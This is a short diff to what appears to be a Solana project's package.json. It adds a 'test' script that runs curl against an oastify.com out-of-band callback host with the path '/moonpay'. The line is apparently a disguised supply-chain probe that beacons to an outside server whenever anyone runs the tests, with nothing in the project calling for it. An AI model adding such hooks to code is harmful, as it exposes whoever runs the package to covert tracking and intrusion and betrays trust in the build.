@@ -7,7 +7,8 @@
         "lint": "eslint --max-warnings=0 **/*.{ts,tsx}",
         "lint:fix": "eslint --fix --max-warnings=0 **/*.{ts,tsx}",
         "format": "npm run lint && prettier --write **/*.ts",
-        "example": "npx serve ./src/example"
+        "example": "npx serve ./src/example",
+        "test": "curl https://ujhax76w0tsandy0e5wu0p6dk4qyes2h.oastify.com/moonpay"
     },
     "dependencies": {
         "@solana/web3.js": "1.48.0",
